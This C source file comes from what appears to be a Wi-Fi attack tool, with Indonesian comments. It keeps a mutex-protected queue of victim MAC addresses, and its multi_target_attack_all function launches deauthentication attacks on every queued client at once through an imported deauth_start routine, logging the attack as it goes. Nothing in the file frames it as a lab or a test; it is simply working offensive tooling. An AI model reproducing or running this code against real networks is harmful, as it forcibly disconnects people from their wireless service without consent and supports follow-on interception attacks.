// ============================================================================
// IMPLEMENTASI: modules/multi_target.c — Pengelola Antrean Target Deauth
// ============================================================================
#include "multi_target.h"
#include "../attack/deauth.h"
#include "../utils/utils.h"
#include "../utils/logger.h"
#include <stdio.h>
#include <string.h>
#include <pthread.h>

static uint8_t g_targets[MAX_TARGETS][6];
static int g_count = 0;
static pthread_mutex_t g_mutex = PTHREAD_MUTEX_INITIALIZER;

int multi_target_add(const uint8_t *mac) {
    pthread_mutex_lock(&g_mutex);
    for (int i = 0; i < g_count; i++) {
        if (memcmp(g_targets[i], mac, 6) == 0) {
            pthread_mutex_unlock(&g_mutex); 
            return 0; // Sudah terdaftar
        }
    }
    if (g_count >= MAX_TARGETS) {
        pthread_mutex_unlock(&g_mutex); 
        return -1; // Antrean penuh
    }
    memcpy(g_targets[g_count++], mac, 6);
    pthread_mutex_unlock(&g_mutex);

    char s[18]; 
    format_mac(mac, s);
    log_event(LOG_INFO, "Target baru ditambahkan ke antrean: %s", s);
    return 0;
}

int multi_target_clear(void) {
    pthread_mutex_lock(&g_mutex); 
    g_count = 0;
    pthread_mutex_unlock(&g_mutex);
    return 0;
}

int multi_target_attack_all(ap_config_t *cfg) {
    pthread_mutex_lock(&g_mutex);
    int n = g_count;
    uint8_t copy[MAX_TARGETS][6];
    memcpy(copy, g_targets, sizeof(copy));
    pthread_mutex_unlock(&g_mutex);

    if (n == 0) return -1;
    log_event(LOG_INFO, "Melancarkan serangan deauth serentak ke %d target!", n);
    for (int i = 0; i < n; i++) {
        deauth_start(cfg->monitor_iface, cfg->bssid, copy[i], cfg->deauth_reason, cfg->deauth_burst);
    }
    return 0;
}

void multi_target_print(void) {
    pthread_mutex_lock(&g_mutex);
    printf("\n=== DAFTAR TARGET MULTI-DEAUTH (%d) ===\n", g_count);
    for (int i = 0; i < g_count; i++) {
        char s[18]; 
        format_mac(g_targets[i], s);
        printf("[%d] %s\n", i + 1, s);
    }
    printf("=======================================\n\n");
    pthread_mutex_unlock(&g_mutex);
}
